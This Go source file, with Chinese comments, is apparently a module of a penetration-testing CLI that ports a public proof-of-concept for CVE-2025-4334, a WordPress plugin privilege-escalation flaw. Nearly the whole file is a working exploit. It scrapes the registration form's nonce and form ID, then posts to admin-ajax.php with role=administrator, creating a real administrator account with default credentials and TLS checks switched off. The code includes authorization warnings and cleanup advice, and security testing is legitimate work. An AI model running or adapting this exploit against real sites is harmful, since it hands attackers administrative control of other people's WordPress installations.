// cve_2025_4334 模块移植自 CVE-Exploits 仓库的 WordPress 权限提升 PoC。
package cve_2025_4334

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/ctkqiang/nezha_cli/internal/model"
	"github.com/ctkqiang/nezha_cli/internal/modulekit"
	"github.com/ctkqiang/nezha_cli/pkg/logger"
)

const (
	// defaultTimeout 是单次 HTTP 请求超时。
	defaultTimeout = 10 * time.Second

	// maxBodyBytes 是响应体读取上限。
	maxBodyBytes = 1 << 20
)

var (
	// noncePattern 匹配注册表单中的 wpr_nonce 隐藏字段。
	noncePattern = regexp.MustCompile(`name=["']wpr_nonce["'][^>]*value=["']([^"']+)["']`)

	// formIDPattern 匹配注册表单中的 wpr_form_id 隐藏字段。
	formIDPattern = regexp.MustCompile(`name=["']wpr_form_id["'][^>]*value=["'](\d+)["']`)
)

// formDetails 保存从注册表单提取的关键标识符。
type formDetails struct {
	nonce   string
	formID  string
	referer string
}

// Module 是 WordPress 权限提升验证模块。
type Module struct{}

/*
New 创建 WordPress 权限提升验证模块实例。

参数:
  - 无。

返回:
  - model.Module: 模块实例。
*/
func New() model.Module {
	return &Module{}
}

/*
Meta 返回 WordPress 权限提升验证模块的元数据。

参数:
  - 无。

返回:
  - model.Meta: 模块名称、类别、说明与参数声明。
*/
func (m *Module) Meta() model.Meta {
	return model.Meta{
		Name:     "cve_2025_4334",
		Aliases:  []string{"wp_priv_esc", "wordpress_register"},
		Category: modulekit.CategoryWeb,
		Summary:  "WordPress 注册接口权限提升验证",
		Description: "验证 WordPress 插件注册接口是否存在 CVE-2025-4334 权限提升缺陷。\n" +
			"适用于已获授权的 WordPress 站点验证，判断接口是否接受 role 字段注入。\n" +
			"纯 Go 实现、无外部依赖；先提取注册表单的 wpr_nonce 与 wpr_form_id，\n" +
			"再向 admin-ajax.php 发送 role=administrator 的注册请求，按响应同时包含\n" +
			"success 与 user_id 判定成功。该操作会在目标站点真实创建管理员账户，必须已获书面授权。",
		Usage:  "use cve_2025_4334\nset URL https://target.com\nset FORM https://target.com/register\nrun",
		Author: modulekit.Author,
		Impact: "高（会在目标站点创建管理员账户）",
		Options: []model.Option{
			modulekit.Option("URL", "WordPress 站点基础 URL，必须以 http:// 或 https:// 开头", true, ""),
			modulekit.Option("FORM", "含注册表单的页面 URL；留空用 URL 首页；页面需含 wpr_nonce 字段", false, ""),
			modulekit.Option("USERNAME", "注册用户名；目标站点将真实创建该账户", false, "0xgh057r3c0nadmin"),
			modulekit.Option("EMAIL", "注册邮箱；需符合邮箱格式以免被插件拒绝", false, "test@admin.ksa"),
			modulekit.Option("PASSWORD", "注册密码；建议使用强随机值", false, "Wiz007@8876@"),
			modulekit.Option("TIMEOUT", "单次请求超时；格式如 10s；超时直接报错", false, "10s"),
		},
		References: []string{
			"https://github.com/ctkqiang/NezhaCli",
			"https://nvd.nist.gov/vuln/detail/CVE-2025-4334",
			"https://wpscan.com/",
		},
	}
}

/*
Run 提取表单标识符并发送构造好的注册请求，随后分析响应。

参数:
  - ctx (context.Context): 执行上下文。
  - options (model.Options): 已合并默认值的模块参数。
  - out (io.Writer): 结果输出目标。

返回:
  - error: 目标非法、表单提取失败或请求失败时返回错误。
*/
func (m *Module) Run(ctx context.Context, options model.Options, out io.Writer) error {
	baseURL := strings.TrimRight(strings.TrimSpace(options.Get("URL")), "/")
	if baseURL == "" || !strings.HasPrefix(baseURL, "http") {
		return fmt.Errorf("URL 必须以 http:// 或 https:// 开头")
	}
	formURL := strings.TrimSpace(options.Get("FORM"))
	if formURL == "" {
		formURL = baseURL + "/"
	}

	timeout := options.Duration("TIMEOUT", defaultTimeout)
	client := &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 仅用于取证验证
		},
	}

	modulekit.Section(out, "利用配置")
	modulekit.KeyValues(out, [][2]string{
		{"目标", baseURL},
		{"表单", formURL},
		{"CVE", "CVE-2025-4334"},
	}, 60)
	fmt.Fprintln(out, "法律边界: 仅限自有站点或已获书面授权的目标；该操作会真实创建账户。")

	logger.Info("正在获取注册表单并提取标识符…")
	details, err := extractForm(ctx, client, formURL)
	if err != nil {
		return fmt.Errorf("表单提取失败: %w", err)
	}
	logger.Success("表单提取完成：nonce=%s formID=%s", truncate(details.nonce, 12), details.formID)

	endpoint := baseURL + "/wp-admin/admin-ajax.php"
	payload := BuildRegistrationPayload(details.nonce, details.formID, details.referer,
		options.String("USERNAME", "0xgh057r3c0nadmin"),
		options.String("EMAIL", "test@admin.ksa"),
		options.String("PASSWORD", "Wiz007@8876@"),
	)

	logger.Info("正在向 %s 发送构造请求…", endpoint)
	body, status, err := postForm(ctx, client, endpoint, payload)
	if err != nil {
		return fmt.Errorf("请求失败: %w", err)
	}

	success := AnalyzeResponse(body, status)
	modulekit.Section(out, "利用结果")
	modulekit.KeyValues(out, [][2]string{
		{"HTTP 状态码", fmt.Sprintf("%d", status)},
		{"响应预览", modulekit.Etc(strings.TrimSpace(string(body)), 80)},
		{"判定", successLabel(success)},
	}, 60)

	if success {
		logger.Success("漏洞验证成功：目标接口接受了 role=administrator 的注册请求")
		fmt.Fprintln(out, "[建议] 立即删除创建的测试账户，并升级或停用存在缺陷的插件。")
	} else {
		logger.Info("响应未出现 success/user_id 特征，目标可能已修复或接口路径不同")
	}
	return nil
}

/*
extractForm 获取表单页面并提取 nonce、表单 ID 与 referer 路径。

参数:
  - ctx (context.Context): 请求上下文。
  - client (*http.Client): HTTP 客户端。
  - formURL (string): 表单页面地址。

返回:
  - formDetails: 提取结果。
  - error: 请求失败或字段缺失时返回错误。
*/
func extractForm(ctx context.Context, client *http.Client, formURL string) (formDetails, error) {
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, formURL, nil)
	if err != nil {
		return formDetails{}, err
	}
	request.Header.Set("User-Agent", "Mozilla/5.0 (authorized security test)")

	response, err := client.Do(request)
	if err != nil {
		return formDetails{}, err
	}
	defer response.Body.Close()

	body, err := io.ReadAll(io.LimitReader(response.Body, maxBodyBytes))
	if err != nil {
		return formDetails{}, err
	}
	if response.StatusCode != http.StatusOK {
		return formDetails{}, fmt.Errorf("表单页面返回 %d", response.StatusCode)
	}

	htmlContent := string(body)
	nonceMatch := noncePattern.FindStringSubmatch(htmlContent)
	if nonceMatch == nil {
		return formDetails{}, fmt.Errorf("未找到 wpr_nonce 字段，目标可能不包含该插件注册表单")
	}
	formIDMatch := formIDPattern.FindStringSubmatch(htmlContent)
	if formIDMatch == nil {
		return formDetails{}, fmt.Errorf("未找到 wpr_form_id 字段")
	}

	parsed, err := url.Parse(formURL)
	if err != nil {
		return formDetails{}, err
	}
	referer := parsed.Path
	if referer == "" {
		referer = "/"
	}

	return formDetails{nonce: nonceMatch[1], formID: formIDMatch[1], referer: referer}, nil
}

/*
BuildRegistrationPayload 构造与上游 PoC 一致的注册表单数据。
该函数同时供模块执行与测试使用。

参数:
  - nonce (string): 表单 wpr_nonce 值。
  - formID (string): 表单 wpr_form_id 值。
  - referer (string): referer 路径。
  - username (string): 注册用户名。
  - email (string): 注册邮箱。
  - password (string): 注册密码。

返回:
  - url.Values: 编码后的表单数据。
*/
func BuildRegistrationPayload(nonce string, formID string, referer string, username string, email string, password string) url.Values {
	data := url.Values{}
	data.Set("action", "wpr_submit_form")
	data.Set("wpr_form_id", formID)
	data.Set("wpr_nonce", nonce)
	data.Set("_wp_http_referer", referer)
	data.Set("wpr[wp_field][user_login]", username)
	data.Set("wpr[wp_field][first_name]", username)
	data.Set("wpr[wp_field][last_name]", username)
	data.Set("wpr[wp_field][user_email]", email)
	data.Set("wpr[wp_field][password]", password)
	data.Set("wpr[wp_field][confirm_password]", password)
	data.Set("wpr[wp_field][role]", "administrator")
	return data
}

/*
postForm 发送表单编码的 POST 请求。

参数:
  - ctx (context.Context): 请求上下文。
  - client (*http.Client): HTTP 客户端。
  - endpoint (string): 目标地址。
  - data (url.Values): 表单数据。

返回:
  - []byte: 响应体。
  - int: HTTP 状态码。
  - error: 请求失败时返回错误。
*/
func postForm(ctx context.Context, client *http.Client, endpoint string, data url.Values) ([]byte, int, error) {
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, strings.NewReader(data.Encode()))
	if err != nil {
		return nil, 0, err
	}
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	request.Header.Set("X-Requested-With", "XMLHttpRequest")
	request.Header.Set("User-Agent", "Mozilla/5.0 (authorized security test)")

	response, err := client.Do(request)
	if err != nil {
		return nil, 0, err
	}
	defer response.Body.Close()

	body, err := io.ReadAll(io.LimitReader(response.Body, maxBodyBytes))
	if err != nil {
		return nil, response.StatusCode, err
	}
	return body, response.StatusCode, nil
}

/*
AnalyzeResponse 按上游判据检查响应：同时包含 success 与 user_id 视为成功。
该函数同时供模块执行与测试使用。

参数:
  - body ([]byte): 响应体。
  - status (int): HTTP 状态码。

返回:
  - bool: 命中判据返回 true。
*/
func AnalyzeResponse(body []byte, status int) bool {
	if status < 200 || status >= 300 {
		return false
	}
	text := string(body)
	return strings.Contains(text, "success") && strings.Contains(text, "user_id")
}

/*
successLabel 把判定结果转换为中文标签。

参数:
  - success (bool): 判定结果。

返回:
  - string: "漏洞验证成功" 或 "未命中判据"。
*/
func successLabel(success bool) string {
	if success {
		return "漏洞验证成功"
	}
	return "未命中判据"
}

/*
truncate 截断长字符串用于日志展示。

参数:
  - value (string): 原始值。
  - limit (int): 最大长度。

返回:
  - string: 截断后的字符串。
*/
func truncate(value string, limit int) string {
	if len(value) <= limit {
		return value
	}
	return value[:limit] + "…"
}
